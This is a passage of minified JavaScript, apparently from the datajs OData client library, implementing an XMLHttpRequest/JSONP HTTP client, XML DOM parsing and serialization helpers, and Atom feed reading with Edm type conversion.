return true;};var createIFrame=function(url){var iframe=window.document.createElement("IFRAME");iframe.style.display="none";var attributeEncodedUrl=url.replace(/&/g,"&amp;").replace(/"/g,"&quot;").replace(/\</g,"&lt;");var html="<html><head><script type=\"text/javascript\" src=\""+attributeEncodedUrl+"\"><\/script><\/head><body><\/body><\/html>";var body=window.document.getElementsByTagName("BODY")[0];body.appendChild(iframe);writeHtmlToIFrame(iframe,html);return iframe;};var createXmlHttpRequest=function(){if(window.XMLHttpRequest){return new window.XMLHttpRequest();}
var exception;if(window.ActiveXObject){try{return new window.ActiveXObject("Msxml2.XMLHTTP.6.0");}catch(_){try{return new window.ActiveXObject("Msxml2.XMLHTTP.3.0");}catch(e){exception=e;}}}else{exception={message:"XMLHttpRequest not supported"};}
throw exception;};var isAbsoluteUrl=function(url){return url.indexOf("http://")===0||url.indexOf("https://")===0||url.indexOf("file://")===0;};var isLocalUrl=function(url){if(!isAbsoluteUrl(url)){return true;}
var location=window.location;var locationDomain=location.protocol+"//"+location.host+"/";return(url.indexOf(locationDomain)===0);};var removeCallback=function(name,tick){try{delete window[name];}catch(err){window[name]=undefined;if(tick===ticks-1){ticks-=1;}}};var removeIFrame=function(iframe){if(iframe){writeHtmlToIFrame(iframe,"");iframe.parentNode.removeChild(iframe);}
return null;};var headerKeysForRead=['Content-Length','Connection','Content-Type','Accept','DataServiceVersion','MaxDataServiceVersion','Etag','Location','Content-Id','If-Match','Authorization'];odata.headerKeysForRead=headerKeysForRead;var readResponseHeaders=function(xhr,headers){var responseHeaders=xhr.getAllResponseHeaders().split(/\r?\n/);if(responseHeaders.length===1&&responseHeaders[0]===''){for(var i=0;i<headerKeysForRead.length;i++){var headerKey=headerKeysForRead[i];var headerValue=xhr.getResponseHeader(headerKey);if(headerValue){responseHeaders.push(headerKey+': '+headerValue);}}}
var i,len;for(i=0,len=responseHeaders.length;i<len;i++){if(responseHeaders[i]){var header=responseHeaders[i].split(": ");headers[header[0]]=header[1];}}};var writeHtmlToIFrame=function(iframe,html){var frameDocument=(iframe.contentWindow)?iframe.contentWindow.document:iframe.contentDocument.document;frameDocument.open();frameDocument.write(html);frameDocument.close();};odata.defaultHttpClient={callbackParameterName:"$callback",formatQueryString:"$format=json",enableJsonpCallback:false,request:function(request,success,error){var result={};var xhr=null;var done=false;var iframe;result.abort=function(){iframe=removeIFrame(iframe);if(done){return;}
done=true;if(xhr){xhr.abort();xhr=null;}
error({message:"Request aborted"});};var handleTimeout=function(){iframe=removeIFrame(iframe);if(!done){done=true;xhr=null;error({message:"Request timed out"});}};var name;var url=request.requestUri;var enableJsonpCallback=defined(request.enableJsonpCallback,this.enableJsonpCallback);var callbackParameterName=defined(request.callbackParameterName,this.callbackParameterName);var formatQueryString=defined(request.formatQueryString,this.formatQueryString);if(!enableJsonpCallback||isLocalUrl(url)){xhr=createXmlHttpRequest();xhr.onreadystatechange=function(){if(done||xhr===null||xhr.readyState!==4){return;}
var statusText=xhr.statusText;var statusCode=xhr.status;if(statusCode===1223){statusCode=204;statusText="No Content";}
var headers=[];readResponseHeaders(xhr,headers);var response={requestUri:url,statusCode:statusCode,statusText:statusText,headers:headers,body:xhr.responseText};done=true;xhr=null;if(statusCode>=200&&statusCode<=299){success(response);}else{error({message:"HTTP request failed",request:request,response:response});}};xhr.open(request.method||"GET",url,true,request.user,request.password);if(request.headers){for(name in request.headers){xhr.setRequestHeader(name,request.headers[name]);}}
if(request.withCredentials)
xhr.withCredentials=true;if(request.timeoutMS){xhr.timeout=request.timeoutMS;xhr.ontimeout=handleTimeout;}
xhr.send(request.body);}else{if(!canUseJSONP(request)){throw{message:"Request is not local and cannot be done through JSONP."};}
var tick=ticks;ticks+=1;var tickText=tick.toString();var succeeded=false;var timeoutId;name="handleJSONP_"+tickText;window[name]=function(data){iframe=removeIFrame(iframe);if(!done){succeeded=true;window.clearTimeout(timeoutId);removeCallback(name,tick);if(window.ActiveXObject&&!window.DOMParser){data=window.JSON.parse(window.JSON.stringify(data));}
delay(success,{body:data,statusCode:200,headers:{"Content-Type":"application/json"}});}};var timeoutMS=(request.timeoutMS)?request.timeoutMS:120000;timeoutId=window.setTimeout(handleTimeout,timeoutMS);var queryStringParams=callbackParameterName+"=parent."+name;if(this.formatQueryString){queryStringParams+="&"+formatQueryString;}
var qIndex=url.indexOf("?");if(qIndex===-1){url=url+"?"+queryStringParams;}else if(qIndex===url.length-1){url=url+queryStringParams;}else{url=url+"&"+queryStringParams;}
iframe=createIFrame(url);}
return result;}};var MAX_DATA_SERVICE_VERSION="2.0";var contentType=function(str){if(!str){return null;}
var contentTypeParts=str.split(";");var properties={};var i,len;for(i=1,len=contentTypeParts.length;i<len;i++){var contentTypeParams=contentTypeParts[i].split("=");properties[trimString(contentTypeParams[0])]=contentTypeParams[1];}
return{mediaType:trimString(contentTypeParts[0]),properties:properties};};var contentTypeToString=function(contentType){if(!contentType){return undefined;}
var result=contentType.mediaType;var property;for(property in contentType.properties){result+=";"+property+"="+contentType.properties[property];}
return result;};var createReadWriteContext=function(contentType,dataServiceVersion,context,handler){return{contentType:contentType,dataServiceVersion:dataServiceVersion,metadata:context?context.metadata:null,context:context,handler:handler};};var fixRequestHeader=function(request,name,value){if(!request){return;}
var headers=request.headers;if(!headers[name]){headers[name]=value;}};var fixDataServiceVersion=function(context,version){if(!context.dataServiceVersion){context.dataServiceVersion=version;}};var getRequestOrResponseHeader=function(requestOrResponse,name){var headers=requestOrResponse.headers;return(headers&&headers[name])||(headers&&headers[name.toLowerCase()])||undefined;};var getContentType=function(requestOrResponse){return contentType(getRequestOrResponseHeader(requestOrResponse,"Content-Type"));};var versionRE=/^\s?(\d+\.\d+);?.*$/;var getDataServiceVersion=function(requestOrResponse){var value=getRequestOrResponseHeader(requestOrResponse,"DataServiceVersion");if(value){var matches=versionRE.exec(value);if(matches&&matches.length){return matches[1];}}};var handlerAccepts=function(handler,cType){return cType&&handler.accept.indexOf(cType.mediaType)>=0;};var handlerRead=function(handler,parseCallback,response,context){if(!response||!response.headers){return false;}
var cType=getContentType(response);var version=getDataServiceVersion(response)||"";var body=response.body;if(!assigned(body)){return false;}
if(handlerAccepts(handler,cType)){var readContext=createReadWriteContext(cType,version,context,handler);readContext.response=response;response.data=parseCallback(handler,body,readContext);return response.data!==undefined;}
return false;};var handlerWrite=function(handler,serializeCallback,request,context){if(!request||!request.headers){return false;}
var cType=getContentType(request);var version=getDataServiceVersion(request);if(!cType||handlerAccepts(handler,cType)){var writeContext=createReadWriteContext(cType,version,context,handler);writeContext.request=request;request.body=serializeCallback(handler,request.data,writeContext);if(request.body!==undefined){fixRequestHeader(request,"DataServiceVersion",writeContext.dataServiceVersion||"1.0");fixRequestHeader(request,"Content-Type",contentTypeToString(writeContext.contentType));fixRequestHeader(request,"MaxDataServiceVersion",handler.maxDataServiceVersion);return true;}}
return false;};var handler=function(parseCallback,serializeCallback,accept,maxDataServiceVersion){return{accept:accept,maxDataServiceVersion:maxDataServiceVersion,read:function(response,context){return handlerRead(this,parseCallback,response,context);},write:function(request,context){return handlerWrite(this,serializeCallback,request,context);}};};var textParse=function(handler,body){return body;};var textSerialize=function(handler,data){if(assigned(data)){return data.toString();}else{return undefined;}};odata.textHandler=handler(textParse,textSerialize,"text/plain",MAX_DATA_SERVICE_VERSION);var xmlMediaType="application/xml";var http="http://";var w3org=http+"www.w3.org/";var ado=http+"schemas.microsoft.com/ado/";var adoDs=ado+"2007/08/dataservices";var xmlnsNS=w3org+"2000/xmlns/";var xmlNS=w3org+"XML/1998/namespace";var edmxNs=ado+"2007/06/edmx";var edmNs=ado+"2008/09/edm";var edmNs2=ado+"2006/04/edm";var edmNs3=ado+"2007/05/edm";var edmNs4=ado+"2009/11/edm";var atomXmlNs=w3org+"2005/Atom";var appXmlNs=w3org+"2007/app";var odataXmlNs=adoDs;var odataMetaXmlNs=adoDs+"/metadata";var odataRelatedPrefix=adoDs+"/related/";var odataScheme=adoDs+"/scheme";var hasLeadingOrTrailingWhitespace=function(text){var re=/(^\s)|(\s$)/;return re.test(text);};var appendAsXml=function(domNode,xmlAsText){var value="<c>"+xmlAsText+"</c>";var parsed=xmlParse(value,null);var doc=domNode.ownerDocument;var imported=parsed.domNode;if("importNode"in doc){imported=doc.importNode(parsed.domNode,true);}
var importedChild=imported.firstChild;while(importedChild){domNode.appendChild(importedChild);importedChild=importedChild.nextSibling;}};var safeSetProperty=function(obj,name,value){try{obj.setProperty(name,value);}catch(_){}};var createDomParser=function(){var exception;var result;if(window.ActiveXObject){try{result=new ActiveXObject("Msxml2.DOMDocument.6.0");result.async=false;return result;}catch(_){try{result=new ActiveXObject("Msxml2.DOMDocument.3.0");result.async=false;safeSetProperty(result,"ProhibitDTD",true);safeSetProperty(result,"MaxElementDepth",256);safeSetProperty(result,"AllowDocumentFunction",false);safeSetProperty(result,"AllowXsltScript",false);return result;}catch(e){exception=e;}}}else{if(window.DOMParser){return new window.DOMParser();}
exception={message:"XML DOM parser not supported"};}
throw exception;};var createAttributeExtension=function(wrappedNode){return{name:wrappedNode.localName,namespace:wrappedNode.nsURI,value:wrappedNode.domNode.value};};var createElementExtension=function(wrappedNode){var result={name:wrappedNode.localName,namespace:wrappedNode.nsURI,value:getElementText(wrappedNode.domNode),attributes:[],children:[]};xmlAttributes(wrappedNode,function(wrappedAttribute){if(wrappedAttribute.nsURI!==xmlnsNS){result.attributes.push(createAttributeExtension(wrappedAttribute));}});xmlChildElements(wrappedNode,function(wrappedElement){result.children.push(createElementExtension(wrappedElement));});return result;};var isWhitespace=function(text){var ws=/^\s*$/;return text===null||ws.test(text);};var isWhitespacePreserveContext=function(domElement){while(domElement!==null&&domElement.nodeType===1){var val=xml_attribute(domElement,"space",xmlNS);if(val==="preserve"){return true;}else if(val==="default"){break;}else{domElement=domElement.parentNode;}}
return false;};var getElementText=function(domElement){var result=null;var cursor=domElement.firstChild;var whitespaceAlreadyRemoved=domElement.ownerDocument.preserveWhiteSpace===false;var whitespacePreserveContext;while(cursor){if(cursor.nodeType===3||cursor.nodeType===4){var text=cursor.nodeValue;var shouldInclude=whitespaceAlreadyRemoved||!isWhitespace(text);if(!shouldInclude){if(whitespacePreserveContext===undefined){whitespacePreserveContext=isWhitespacePreserveContext(domElement);}
shouldInclude=whitespacePreserveContext;}
if(shouldInclude){if(!result){result=text;}else{result+=text;}}}
cursor=cursor.nextSibling;}
return result;};var getSingleElementByTagNameNS=function(domNode,namespaceURI,localName){var result;if(domNode.getElementsByTagNameNS){result=domNode.getElementsByTagNameNS(namespaceURI,localName);if(result.length!==0){return result[0];}}else{var child=domNode.firstChild;while(child){if(child.nodeType===1&&xmlLocalName(child)===localName&&child.namespaceURI===namespaceURI){return child;}
child=child.nextSibling;}}
return null;};var checkParserErrorElement=function(element,text){var parserErrorNS="http://www.mozilla.org/newlayout/xml/parsererror.xml";var wrappedElement=xml_wrapNode(element,"");if(wrappedElement.localName==="parsererror"&&wrappedElement.nsURI===parserErrorNS){var reason=getElementText(element);var sourceTextElement=getSingleElementByTagNameNS(wrappedElement,parserErrorNS,"sourcetext");var srcText=(sourceTextElement)?sourceTextElement.nodeValue:"";throw{message:reason,errorXmlText:text,srcText:srcText};}
var xhtmlNS="http://www.w3.org/1999/xhtml";if(wrappedElement.localName==="h3"&&wrappedElement.nsURI==xhtmlNS||getSingleElementByTagNameNS(element,xhtmlNS,"h3")){throw{message:xmlInnerText(element),errorXmlText:text,srcText:""};}};var xmlAddNamespaceAttribute=function(domNode,name,attributeNamespace){var doc=domNode.ownerDocument;var attribute;if(doc.createAttributeNS){attribute=doc.createAttributeNS(xmlnsNS,name);}else{attribute=doc.createNode(2,name,xmlnsNS);}
attribute.nodeValue=attributeNamespace;domNode.setAttributeNode(attribute);};var xmlAppendPreserving=function(domNode,text){if(hasLeadingOrTrailingWhitespace(text)){var attr=xmlNewDomAttribute(domNode,"space",xmlNS,"xml");attr.value="preserve";}
var textNode=domNode.ownerDocument.createTextNode(text);domNode.appendChild(textNode);};var xmlAttributes=function(element,onAttributeCallback){var attribute;var domNode=element.domNode;var i,len;for(i=0,len=domNode.attributes.length;i<len;i++){attribute=domNode.attributes.item(i);onAttributeCallback(xml_wrapNode(attribute));}};var xmlAttribute=function(element,localName,nsURI){return xml_attribute(element.domNode,localName,nsURI);};var xmlAttributeNode=function(domNode,localName,nsURI){var attributes=domNode.attributes;if(attributes.getNamedItemNS){return attributes.getNamedItemNS(nsURI,localName);}
return attributes.getQualifiedItem(localName,nsURI);};var xmlChildElements=function(element,onElementCallback){var child=element.domNode.firstChild;var childBaseURI;while(child!==null){if(child.nodeType===1){childBaseURI=normalizeURI(xml_baseURI(child),element.baseURI);onElementCallback(xml_wrapNode(child,childBaseURI));}
child=child.nextSibling;}};var xmlFirstElement=function(element){var child=element.domNode.firstChild;var childBaseURI;while(child!==null){if(child.nodeType===1){childBaseURI=normalizeURI(xml_baseURI(child),element.baseURI);return xml_wrapNode(child,childBaseURI);}
child=child.nextSibling;}
return null;};var xmlInnerText=function(domNode){var result=domNode.text;if(result!==undefined){return result;}
result="";var cursor=domNode.firstChild;if(cursor){do{if(cursor.nodeType===3||cursor.nodeType===4){result+=cursor.nodeValue;}
var next=cursor.firstChild;if(!next){while(cursor!==domNode){next=cursor.nextSibling;if(next){cursor=next;break;}else{cursor=cursor.parentNode;}}}else{cursor=next;}}while(cursor!==domNode);}
return result;};var xmlLocalName=function(node){if(node.localName){return node.localName;}
return node.baseName;};var xmlNewDocument=function(name,nsURI){var dom;if(window.ActiveXObject){dom=createDomParser();dom.documentElement=dom.createNode(1,name,nsURI);}
else if(window.document.implementation&&window.document.implementation.createDocument){dom=window.document.implementation.createDocument(nsURI,name,null);}
return xml_wrapNode(dom.documentElement);};var xmlNewDomAttribute=function(domNode,localName,nsURI,nsPrefix){var doc=domNode.ownerDocument;var attribute;localName=(nsPrefix)?(nsPrefix+":"+localName):localName;if(doc.createAttributeNS){attribute=doc.createAttributeNS(nsURI,localName);domNode.setAttributeNodeNS(attribute);}else{attribute=doc.createNode(2,localName,nsURI||undefined);domNode.setAttributeNode(attribute);}
return attribute;};var xmlNewDomElement=function(domNode,localName,nsURI,nsPrefix){var doc=domNode.ownerDocument;var element;localName=(nsPrefix)?(nsPrefix+":"+localName):localName;if(doc.createElementNS){element=doc.createElementNS(nsURI,localName);}else{element=doc.createNode(1,localName,nsURI||undefined);}
domNode.appendChild(element);return element;};var xmlNewElement=function(parent,name,nsURI,value){var dom=parent.domNode.ownerDocument;var element;if(dom.createElementNS){element=dom.createElementNS(nsURI,name);}else{element=dom.createNode(1,name,nsURI||undefined);}
if(value){xmlAppendPreserving(element,value);}
parent.domNode.appendChild(element);return xml_wrapNode(element);};var xmlNewAttribute=function(element,name,nsURI,value){var dom=element.domNode.ownerDocument;var attribute;if(dom.createAttributeNS){attribute=dom.createAttributeNS(nsURI,name);attribute.value=value;element.domNode.setAttributeNodeNS(attribute);}else{attribute=dom.createNode(2,name,nsURI||undefined);attribute.value=value;element.domNode.setAttributeNode(attribute);}
return xml_wrapNode(attribute);};var xmlQualifyXmlTagName=function(name,prefix){if(prefix){return prefix+":"+name;}
return name;};var xmlParse=function(text,baseURI){var root=xml_parse(text);var rootBaseURI=normalizeURI(xml_baseURI(root),baseURI);return xml_wrapNode(root,rootBaseURI);};var xmlSerialize=function(root){var dom=root.domNode.ownerDocument;return xmlSerializeNode(dom);};var xmlSerializeChildren=function(domNode){var children=domNode.childNodes;var i,len=children.length;if(len===0){return"";}
var fragment=domNode.ownerDocument.createDocumentFragment();for(i=0;i<len;i++){fragment.appendChild(children[i].cloneNode(true));}
return xmlSerializeNode(fragment);};var xmlSerializeNode=function(domNode){var xml=domNode.xml;if(xml!==undefined){return xml;}
if(window.XMLSerializer){var serializer=new window.XMLSerializer();return serializer.serializeToString(domNode);}
throw{message:"XML serialization unsupported"};};var xml_attribute=function(domNode,localName,nsURI){if(domNode.getAttributeNS){return domNode.getAttributeNS(nsURI||null,localName);}
var node=domNode.attributes.getQualifiedItem(localName,nsURI);if(node){return node.value;}
return null;};var xml_baseURI=function(domNode){return xml_attribute(domNode,"base",xmlNS);};var xml_parse=function(text){var dom=createDomParser();if(dom.parseFromString){dom=dom.parseFromString(text,"text/xml");checkParserErrorElement(dom.documentElement,text);}else{dom.loadXML(text);if(dom.parseError.errorCode!==0){throw{message:dom.parseError.reason,errorXmlText:text,srcText:dom.parseError.srcText};}}
return dom.documentElement;};var xml_wrapNode=function(domNode,baseURI){var nsURI=domNode.namespaceURI;var nodeName=domNode.nodeName;if(!nsURI){if(domNode.nodeType===2&&(nodeName==="xmlns"||nodeName.indexOf("xmlns:",0)===0)){nsURI=xmlnsNS;}else{nsURI=null;}}
return{baseURI:baseURI,domNode:domNode,localName:xmlLocalName(domNode),nsURI:nsURI};};var readODataXmlDocument=function(xmlRoot){if(xmlRoot.nsURI===odataXmlNs){switch(xmlRoot.localName){case"links":return readLinks(xmlRoot);case"uri":return readUri(xmlRoot);}}
return undefined;};var readLinks=function(linksElement){var uris=[];xmlChildElements(linksElement,function(child){if(child.localName==="uri"&&child.nsURI===odataXmlNs){var uri=readUri(child);uris.push(uri);}});return{results:uris};};var readUri=function(uriElement){return{uri:xmlInnerText(uriElement.domNode)};};var writeODataXmlDocument=function(data){if(payloadTypeOf(data)===PAYLOADTYPE_COMPLEXTYPE&&!data.__metadata&&data.hasOwnProperty("uri")){return writeUri(data);}};var writeUri=function(data){var uri=writeODataXmlNode(null,"uri",odataXmlNs);if(data.uri){xmlAppendPreserving(uri.domNode,data.uri);}
return uri;};var writeODataXmlNode=function(parent,name,nsURI){if(parent){return xmlNewElement(parent,name,nsURI);}
return xmlNewDocument(name,nsURI);};var xmlParser=function(handler,text){if(text){var root=xmlParse(text);if(root){return readODataXmlDocument(root);}}};var xmlSerializer=function(handler,data,context){var cType=context.contentType=context.contentType||contentType(xmlMediaType);var result=undefined;if(cType&&cType.mediaType===xmlMediaType){var xmlDoc=writeODataXmlDocument(data);if(xmlDoc){result=xmlSerialize(xmlDoc);}}
return result;};odata.xmlHandler=handler(xmlParser,xmlSerializer,xmlMediaType,MAX_DATA_SERVICE_VERSION);var atomAcceptTypes=["application/atom+xml","application/atomsvc+xml","application/xml"];var atomMediaType=atomAcceptTypes[0];var inlineTag=xmlQualifyXmlTagName("inline","m");var propertiesTag=xmlQualifyXmlTagName("properties","m");var propertyTypeAttribute=xmlQualifyXmlTagName("type","m");var propertyNullAttribute=xmlQualifyXmlTagName("null","m");var nonExtensionNamepaces=[atomXmlNs,appXmlNs,xmlNS,xmlnsNS];var knownCustomizationPaths={SyndicationAuthorEmail:"author/email",SyndicationAuthorName:"author/name",SyndicationAuthorUri:"author/uri",SyndicationContributorEmail:"contributor/email",SyndicationContributorName:"contributor/name",SyndicationContributorUri:"contributor/uri",SyndicationPublished:"published",SyndicationRights:"rights",SyndicationSummary:"summary",SyndicationTitle:"title",SyndicationUpdated:"updated"};var isExtensionNs=function(nsURI){return!(contains(nonExtensionNamepaces,nsURI));};var propertyTypeDefaultConverter=function(propertyValue){return propertyValue;};var parseBool=function(propertyValue){return propertyValue==="true";};var parseDateTimeRE=/^(-?\d{4,})-(\d{2})-(\d{2})T(\d{2}):(\d{2}):(\d{2})(?:\.(\d+))?(.*)$/;var parseDateTimeMaybeOffset=function(value,withOffset){var parts=parseDateTimeRE.exec(value);var offset=(parts)?getCanonicalTimezone(parts[8]):null;if(!parts||(!withOffset&&offset!=="Z")){throw{message:"Invalid date/time value"};}
var year=parseInt10(parts[1]);if(year<=0){year++;}
var ms=parts[7];var ns=0;if(!ms){ms=0;}else{if(ms.length>7){throw{message:"Cannot parse date/time value to given precision."};}
ns=formatNumberWidth(ms.substring(3),4,true);ms=formatNumberWidth(ms.substring(0,3),3,true);ms=parseInt10(ms);ns=parseInt10(ns);}
var hours=parseInt10(parts[4]);var minutes=parseInt10(parts[5]);var seconds=parseInt10(parts[6]);if(offset!=="Z"){var timezone=parseTimezone(offset);var direction=-(timezone.d);hours+=timezone.h*direction;minutes+=timezone.m*direction;}
var result=new Date();result.setUTCFullYear(year,parseInt10(parts[2])-1,parseInt10(parts[3]));result.setUTCHours(hours,minutes,seconds,ms);if(isNaN(result.valueOf())){throw{message:"Invalid date/time value"};}
if(withOffset){result.__edmType="Edm.DateTimeOffset";result.__offset=offset;}
if(ns){result.__ns=ns;}
return result;};var parseDateTime=function(propertyValue){return parseDateTimeMaybeOffset(propertyValue,true);};var parseDateTimeOffset=function(propertyValue){return parseDateTimeMaybeOffset(propertyValue,true);};var propertyTypeConverters={"Edm.Boolean":parseBool,"Edm.Binary":propertyTypeDefaultConverter,"Edm.DateTime":parseDateTime,"Edm.DateTimeOffset":parseDateTimeOffset,"Edm.Time":parseDuration,"Edm.Decimal":propertyTypeDefaultConverter,"Edm.Guid":propertyTypeDefaultConverter,"Edm.String":propertyTypeDefaultConverter,"Edm.Byte":parseInt10,"Edm.Double":parseFloat,"Edm.Single":parseFloat,"Edm.Int16":parseInt10,"Edm.Int32":parseInt10,"Edm.Int64":propertyTypeDefaultConverter,"Edm.SByte":parseInt10};var formatToString=function(value){return value.toString();};var propertyTypeFormatters={"Edm.Binary":formatToString,"Edm.Boolean":formatToString,"Edm.Byte":formatToString,"Edm.DateTime":formatDateTimeOffset,"Edm.DateTimeOffset":formatDateTimeOffset,"Edm.Decimal":formatToString,"Edm.Double":formatToString,"Edm.Guid":formatToString,"Edm.Int16":formatToString,"Edm.Int32":formatToString,"Edm.Int64":formatToString,"Edm.SByte":formatToString,"Edm.Single":formatToString,"Edm.String":formatToString,"Edm.Time":formatDuration};var isPrimitiveType=function(typeName){return typeName&&(propertyTypeConverters[typeName]!==undefined);};var convertFromAtomPropertyText=function(value,targetType){if(value!==null&&targetType){var converter=propertyTypeConverters[targetType];if(converter){value=converter(value);}}
return value;};var convertToAtomPropertyText=function(value,targetType){if(value!==null&&targetType){if(isDate(value)){targetType=(isDateTimeOffset(value))?"Edm.DateTimeOffset":"Edm.DateTime";}
var converter=propertyTypeFormatters[targetType];if(converter){value=converter(value);}}
return value;};var readAtomDocument=function(atomElement,metadata){if(atomElement.nsURI===atomXmlNs){switch(atomElement.localName){case"feed":return readAtomFeed(atomElement,metadata);case"entry":return readAtomEntry(atomElement,metadata);}}
if(atomElement.nsURI===appXmlNs&&atomElement.localName==="service"){return readAtomServiceDocument(atomElement);}};var readAtomFeed=function(atomFeed,metadata){var feedMetadata={};var feed={results:[],__metadata:feedMetadata};feedMetadata.feed_extensions=readAtomExtensionAttributes(atomFeed);xmlChildElements(atomFeed,function(feedChild){switch(feedChild.nsURI){case atomXmlNs:switch(feedChild.localName){case"id":feedMetadata.uri=normalizeURI(xmlInnerText(feedChild.domNode),feedChild.baseURI);feedMetadata.uri_extensions=readAtomExtensionAttributes(feedChild);break;case"title":feedMetadata.title=xmlInnerText(feedChild.domNode);feedMetadata.title_extensions=readAtomExtensionAttributes(feedChild);break;case"entry":var entry=readAtomEntry(feedChild,metadata);feed.results.push(entry);break;case"link":readAtomFeedLink(feedChild,feed);break;}
return;case odataMetaXmlNs:if(feedChild.localName==="count"){feed.__count=parseInt10(xmlInnerText(feedChild.domNode));return;}
break;}
var extension=readAtomExtensionElement(feedChild);feedMetadata.feed_extensions.push(extension);});return feed;};var readAtomFeedLink=function(feedLinkElement,feed){var link=readAtomLink(feedLinkElement);var feedMetadata=feed.__metadata;switch(link.rel){case"next":feed.__next=link.href;feedMetadata.next_extensions=link.extensions;break;case"self":feedMetadata.self=link.href;feedMetadata.self_extensions=link.extensions;break;}};var readAtomLink=function(linkElement){var link={extensions:[]};var linkExtension;xmlAttributes(linkElement,function(attribute){if(!attribute.nsURI){switch(attribute.localName){case"href":link.href=normalizeURI(attribute.domNode.nodeValue,linkElement.baseURI);return;case"type":case"rel":link[attribute.localName]=attribute.domNode.nodeValue;return;}}
if(isExtensionNs(attribute.nsURI)){linkExtension=readAtomExtensionAttribute(attribute);link.extensions.push(linkExtension);}});if(!link.href){throw{error:"href attribute missing on link element",element:linkElement};}
return link;};var readAtomExtensionElement=function(atomExtension){var extension={name:atomExtension.localName,namespaceURI:atomExtension.nsURI,attributes:readAtomExtensionAttributes(atomExtension),children:[]};xmlChildElements(atomExtension,function(child){var childExtension=readAtomExtensionElement(child);extension.children.push(childExtension);});if(extension.children.length===0){var text=xmlInnerText(atomExtension.domNode);if(text){extension.value=text;}}
return extension;};var readAtomExtensionAttributes=function(xmlElement){var extensions=[];xmlAttributes(xmlElement,function(attribute){if(isExtensionNs(attribute.nsURI)){var extension=readAtomExtensionAttribute(attribute);extensions.push(extension);}});return extensions;};var readAtomExtensionAttribute=function(attribute){return{name:attribute.localName,namespaceURI:attribute.nsURI,value:attribute.domNode.nodeValue};};var getObjectValueByPath=function(path,item){if(path.indexOf('/')===-1){return item[path];}else{var parts=path.split('/');var i,len;for(i=0,len=parts.length;i<len;i++){if(item===null){return undefined;}
item=item[parts[i]];if(item===undefined){return item;}}
return item;}};var setObjectValueByPath=function(path,target,value,propertyType){var propertyName;if(path.indexOf('/')===-1){target[path]=value;propertyName=path;}else{var parts=path.split('/');var i,len;for(i=0,len=(parts.length-1);i<len;i++){var next=target[parts[i]];if(next===undefined){next={};target[parts[i]]=next;}else if(next===null){return;}
target=next;}
propertyName=parts[i];target[propertyName]=value;}
if(propertyType){var metadata=target.__metadata=target.__metadata||{};var properties=metadata.properties=metadata.properties||{};var property=properties[propertyName]=properties[propertyName]||{};property.type=propertyType;}};var expandCustomizationPath=function(path){return knownCustomizationPaths[path]||path;};var getXmlPathValue=function(ns,xmlPath,element,readAsXml){var parts=xmlPath.split('/');var i,len;for(i=0,len=parts.length;i<len;i++){if(parts[i].charAt(0)==="@"){return xml_attribute(element,parts[i].substring(1),ns);}else{element=getSingleElementByTagNameNS(element,ns,parts[i]);if(!element){return undefined;}}}
if(readAsXml){return xmlSerializeChildren(element);}else{return xmlInnerText(element);}};var setXmlPathValue=function(ns,nsPrefix,xmlPath,element,writeAsKind,value){var target=element;var parts=xmlPath.split('/');var i,len;for(i=0,len=parts.length;i<len;i++){var next;if(parts[i].charAt(0)==="@"){next=xmlAttributeNode(target,parts[i].substring(1),ns);if(!next){next=xmlNewDomAttribute(target,parts[i].substring(1),ns,nsPrefix);}}else{next=getSingleElementByTagNameNS(target,ns,parts[i]);if(!next){next=xmlNewDomElement(target,parts[i],ns,nsPrefix);}}
target=next;}
if(target.nodeType===2){target.value=value;}else{if(writeAsKind){target.setAttribute("type",writeAsKind);}
if(writeAsKind==="xhtml"){appendAsXml(target,value);}else{xmlAppendPreserving(target,value);}}};var isElementEmpty=function(element){if(element.childNodes.length){return false;}
var attributes=element.attributes;var len=attributes.length;if(len===0){return true;}
for(var i=0;i<len;i++){var attributeName=attributes[i].nodeName;if(attributeName!=="xmlns"&&attributeName.indexOf("xmlns:")!==0&&attributeName!=="m:type"){return false;}}
return true;};var removeXmlProperty=function(entryElement,propertyPath){var propertiesElement=getSingleElementByTagNameNS(entryElement.domNode,odataMetaXmlNs,"properties");if(!propertiesElement){var contentElement=getSingleElementByTagNameNS(entryElement.domNode,atomXmlNs,"content");if(contentElement){propertiesElement=getSingleElementByTagNameNS(contentElement,odataMetaXmlNs,"properties");}}
if(propertiesElement){var propertyParentElement=propertiesElement;var parts=propertyPath.split("/");var i,len;for(i=0,len=(parts.length-1);i<len;i++){propertyParentElement=getSingleElementByTagNameNS(propertyParentElement,odataXmlNs,parts[i]);if(!propertyParentElement){return;}}
var propertyElement=getSingleElementByTagNameNS(propertyParentElement,odataXmlNs,parts[i]);if(propertyElement){propertyParentElement.removeChild(propertyElement);}
var candidate=propertyParentElement;while(candidate!==propertiesElement&&isElementEmpty(candidate)){var parent=candidate.parentNode;parent.removeChild(candidate);candidate=parent;}}};var applyEntryCustomizationToEntry=function(customization,sourcePath,entryElement,entryObject,propertyType,suffix,context){var targetPath=customization["FC_TargetPath"+suffix];var xmlPath=expandCustomizationPath(targetPath);var xmlNamespace=(targetPath!==xmlPath)?atomXmlNs:customization["FC_NsUri"+suffix];var keepInContent=(customization["FC_KeepInContent"+suffix]==="true")?true:false;var writeAsKind=customization["FC_ContentKind"+suffix];var prefix=customization["FC_NsPrefix"+suffix]||null;var value=getObjectValueByPath(sourcePath,entryObject);if(!assigned(value)){return;}
if(!keepInContent){context.dataServiceVersion="2.0";removeXmlProperty(entryElement,sourcePath);}
value=convertToAtomPropertyText(value,propertyType);setXmlPathValue(xmlNamespace,prefix,xmlPath,entryElement.domNode,writeAsKind,value);};var applyEntryCustomizationToObject=function(customization,sourcePath,entryElement,entryObject,propertyType,suffix){if(customization["FC_KeepInContent"+suffix]==="true"){return;}
if(getObjectValueByPath(sourcePath,entryObject)===null){return;}
var targetPath=customization["FC_TargetPath"+suffix];var xmlPath=expandCustomizationPath(targetPath);var xmlNamespace=(targetPath!==xmlPath)?atomXmlNs:customization["FC_NsUri"+suffix];var readAsXhtml=(customization["FC_ContentKind"+suffix]==="xhtml");var value=getXmlPathValue(xmlNamespace,xmlPath,entryElement.domNode,readAsXhtml);if(value===undefined){return;}
value=convertFromAtomPropertyText(value,propertyType);setObjectValueByPath(sourcePath,entryObject,value,propertyType);};var lookupPropertyType=function(metadata,entityType,path){var parts=path.split("/");var i,len;while(entityType){var traversedType=entityType;for(i=0,len=parts.length;i<len;i++){var properties=traversedType.property;if(!properties){break;}
var propertyFound=lookupProperty(properties,parts[i]);if(!propertyFound){break;}
var propertyType=propertyFound.type;if(!propertyType||isPrimitiveType(propertyType)){return propertyType||null;}
traversedType=lookupComplexType(propertyType,metadata);if(!traversedType){return null;}}
entityType=lookupEntityType(entityType.baseType,metadata);}
